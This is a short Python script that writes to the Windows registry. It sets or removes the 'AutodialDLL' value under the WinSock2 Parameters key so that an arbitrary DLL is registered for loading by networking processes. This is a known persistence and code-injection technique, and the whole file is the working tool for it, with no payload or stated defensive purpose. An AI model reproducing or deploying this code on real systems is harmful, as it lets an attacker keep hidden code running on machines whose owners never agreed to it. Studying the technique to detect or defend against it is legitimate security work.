import winreg as wrg
from colorama import Fore, init
class AutodialDLL:
    def __init__(self) -> None:
        init(convert=True)
        # Winsock2 Path
        self.winsock2: str = r"SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters"
        
    def OpenWinsock(self) -> wrg.HKEYType:
        # Open Key
        try:
            loc: wrg.HKEYType = wrg.OpenKeyEx(wrg.HKEY_LOCAL_MACHINE, self.winsock2, 0, wrg.KEY_SET_VALUE)
            assert loc != None, f"{Fore.RED}Key is None!"
            return loc
        except Exception as e:
            print(f"{Fore.RED}Failed to open Winsock2:{Fore.WHITE} {e}")

    def AddDLL(self, dll: str) -> None:
        # Set AutodialDLL Key
        loc = self.OpenWinsock()
        try:
            wrg.SetValueEx(loc, "AutodialDLL", 0, wrg.REG_SZ, dll)
        except Exception as e:
            print(f"{Fore.RED}Failed to set AutodialDLL:{Fore.WHITE} {e}")
        finally:
            if loc:
                wrg.CloseKey(loc)

    def RemoveDLL(self) -> None:
        # Remove AutodialDLL
        loc = self.OpenWinsock()
        try:
            wrg.DeleteValue(loc, "AutodialDLL")
        except Exception as e:
            print(f"{Fore.RED}Key doesn't exist:{Fore.WHITE} {e}")
        finally:
            if loc:
                wrg.CloseKey(loc)

if __name__ == "__main__":
    exit()